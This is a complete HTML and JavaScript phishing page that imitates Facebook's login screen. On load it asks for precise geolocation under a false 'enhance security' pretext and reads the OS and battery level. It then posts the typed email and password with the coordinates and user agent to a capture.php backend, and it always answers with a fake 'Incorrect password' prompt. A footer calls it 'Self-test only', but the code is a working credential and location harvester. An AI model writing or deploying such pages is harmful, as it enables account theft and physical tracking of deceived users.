<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook – Log in or sign up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
            padding: 30px 28px 28px;
            max-width: 396px;
            width: 100%;
            text-align: center;
        }

        .fb-logo {
            font-size: 44px;
            font-weight: 700;
            color: #1877f2;
            letter-spacing: -1px;
            margin-bottom: 4px;
            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        .fb-logo span {
            background: #1877f2;
            color: white;
            padding: 2px 10px;
            border-radius: 4px;
            font-size: 20px;
            margin-right: 4px;
            display: inline-block;
        }

        .subhead {
            color: #606770;
            font-size: 15px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 12px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            background: #ffffff;
            transition: 0.2s;
            outline: none;
        }
        .form-group input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            font-size: 20px;
            font-weight: 700;
            color: white;
            background: #1877f2;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 6px;
        }
        .btn-login:hover {
            background: #166fe5;
        }
        .btn-login:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0 16px;
            gap: 12px;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dadde1;
        }
        .divider span {
            font-size: 14px;
            color: #606770;
            font-weight: 600;
        }

        .btn-create {
            width: 100%;
            padding: 14px;
            font-size: 17px;
            font-weight: 700;
            color: white;
            background: #42b72a;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-create:hover {
            background: #36a420;
        }
        .btn-create:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .forgot {
            display: block;
            margin-top: 14px;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        .forgot:hover {
            text-decoration: underline;
        }

        .device-info {
            margin-top: 18px;
            padding: 10px 14px;
            background: #f7f8fa;
            border-radius: 6px;
            font-size: 13px;
            color: #606770;
            border: 1px solid #e4e6eb;
            display: none;
        }
        .device-info.visible {
            display: block;
        }
        .device-info .label {
            font-weight: 600;
            color: #1c1e21;
        }

        .location-status {
            margin-top: 14px;
            padding: 12px 14px;
            background: #e7f3ff;
            border-radius: 6px;
            border-left: 4px solid #1877f2;
            font-size: 13px;
            display: none;
            text-align: left;
        }
        .location-status.visible {
            display: block;
        }
        .location-status .coords {
            font-family: monospace;
            background: white;
            padding: 2px 10px;
            border-radius: 4px;
            display: inline-block;
            margin-top: 2px;
        }

        .perm-notice {
            margin-top: 12px;
            padding: 10px;
            background: #fff8e1;
            border-radius: 6px;
            border: 1px solid #f5d98e;
            font-size: 13px;
            color: #7a5a1a;
            display: none;
        }
        .perm-notice.visible {
            display: block;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8c9ba8;
            border-top: 1px solid #e6ecf0;
            padding-top: 14px;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="fb-logo">
        <span>f</span> facebook
    </div>
    <div class="subhead">Connect with friends and the world around you.</div>

    <form id="loginForm">
        <div class="form-group">
            <input type="text" id="email" placeholder="Email or phone number" value="test@example.com" />
        </div>
        <div class="form-group">
            <input type="password" id="password" placeholder="Password" value="password123" />
        </div>
        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>

    <a href="#" class="forgot">Forgot password?</a>

    <div class="divider">
        <span>or</span>
    </div>

    <button class="btn-create" id="createBtn" disabled>Create new account</button>

    <div class="perm-notice" id="permNotice">
        ⚠️ To enhance security, we need your location. Please click "Allow".
    </div>

    <div class="device-info" id="deviceInfo">
        <div><span class="label">🖥️ OS:</span> <span id="osDisplay">—</span></div>
        <div><span class="label">🔋 Battery:</span> <span id="batteryDisplay">—</span></div>
    </div>

    <div class="location-status" id="locationStatus">
        <div><span class="label">📍 Location captured:</span></div>
        <div class="coords" id="coordsDisplay">—</div>
        <div style="font-size:12px; color:#606770; margin-top:4px;" id="timestampDisplay"></div>
    </div>

    <div class="footer">
        🔒 <strong>Self-test only</strong> · You are the only target
    </div>
</div>

<script>
(function() {
    const form = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    const locationStatus = document.getElementById('locationStatus');
    const coordsDisplay = document.getElementById('coordsDisplay');
    const timestampDisplay = document.getElementById('timestampDisplay');
    const permNotice = document.getElementById('permNotice');
    const deviceInfo = document.getElementById('deviceInfo');
    const osDisplay = document.getElementById('osDisplay');
    const batteryDisplay = document.getElementById('batteryDisplay');

    let locationCaptured = false;
    let batteryLevel = null;
    let osName = 'Unknown';

    // ---------- 1. Detect OS ----------
    function detectOS() {
        const ua = navigator.userAgent;
        if (ua.includes('Windows')) osName = 'Windows';
        else if (ua.includes('Mac OS')) osName = 'macOS';
        else if (ua.includes('Linux')) osName = 'Linux';
        else if (ua.includes('Android')) osName = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) osName = 'iOS';
        else osName = 'Other';
        osDisplay.textContent = osName;
        return osName;
    }
    detectOS();

    // ---------- 2. Get Battery Level ----------
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            batteryLevel = Math.round(battery.level * 100);
            batteryDisplay.textContent = batteryLevel + '%' + (battery.charging ? ' ⚡(charging)' : '');
            deviceInfo.classList.add('visible');
        }).catch(() => {
            batteryDisplay.textContent = 'Unavailable';
            deviceInfo.classList.add('visible');
        });
    } else {
        batteryDisplay.textContent = 'API not supported';
        deviceInfo.classList.add('visible');
    }

    // ---------- 3. Show location ----------
    function showLocation(lat, lng, accuracy, timestamp) {
        coordsDisplay.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}  (accuracy: ±${accuracy || '?'}m)`;
        timestampDisplay.textContent = `Captured: ${new Date(timestamp).toLocaleString()}`;
        locationStatus.classList.add('visible');
        locationCaptured = true;
        permNotice.classList.remove('visible');
        try {
            sessionStorage.setItem('fb_geo', JSON.stringify({lat, lng, accuracy, timestamp}));
        } catch(e) {}
    }

    // ---------- 4. Send ALL data to PHP backend ----------
    function sendToServer(lat, lng, accuracy, timestamp) {
        const email = document.getElementById('email').value || 'N/A';
        const password = document.getElementById('password').value || 'N/A';

        const payload = {
            lat: lat,
            lng: lng,
            accuracy: accuracy,
            timestamp: timestamp,
            email: email,
            password: password,
            os: osName,
            battery: batteryLevel,
            userAgent: navigator.userAgent
        };

        fetch('capture.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => console.log('Server response:', data))
        .catch(err => console.warn('Server offline?', err));
    }

    // ---------- 5. Request geolocation ----------
    function requestLocation() {
        if (!navigator.geolocation) {
            coordsDisplay.textContent = '❌ Geolocation not supported.';
            locationStatus.classList.add('visible');
            return;
        }
        permNotice.classList.add('visible');
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude, lng = pos.coords.longitude;
                const acc = pos.coords.accuracy, ts = pos.timestamp || Date.now();
                permNotice.classList.remove('visible');
                showLocation(lat, lng, acc, ts);
                sendToServer(lat, lng, acc, ts);
            },
            (err) => {
                permNotice.classList.remove('visible');
                let msg = '❌ Location denied. Refresh and click "Allow" to continue.';
                if (err.code === err.TIMEOUT) msg = '❌ Request timed out.';
                coordsDisplay.textContent = msg;
                locationStatus.classList.add('visible');
            },
            { enableHighAccuracy: true, timeout: 12000 }
        );
    }

    setTimeout(requestLocation, 600);

    // ---------- 6. Form submit ----------
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        if (!locationCaptured) {
            requestLocation();
        }

        const original = loginBtn.innerHTML;
        loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
        loginBtn.disabled = true;

        setTimeout(() => {
            loginBtn.innerHTML = original;
            loginBtn.disabled = false;
            document.getElementById('password').value = '';
            document.getElementById('password').placeholder = 'Incorrect password. Try again.';
            setTimeout(() => {
                document.getElementById('password').placeholder = 'Password';
            }, 2500);
        }, 2500);
    });

    // ---------- 7. Restore location from session ----------
    try {
        const stored = sessionStorage.getItem('fb_geo');
        if (stored) {
            const data = JSON.parse(stored);
            if (data.lat) showLocation(data.lat, data.lng, data.accuracy, data.timestamp || Date.now());
        }
    } catch(e) {}
})();
</script>
</body>
</html>
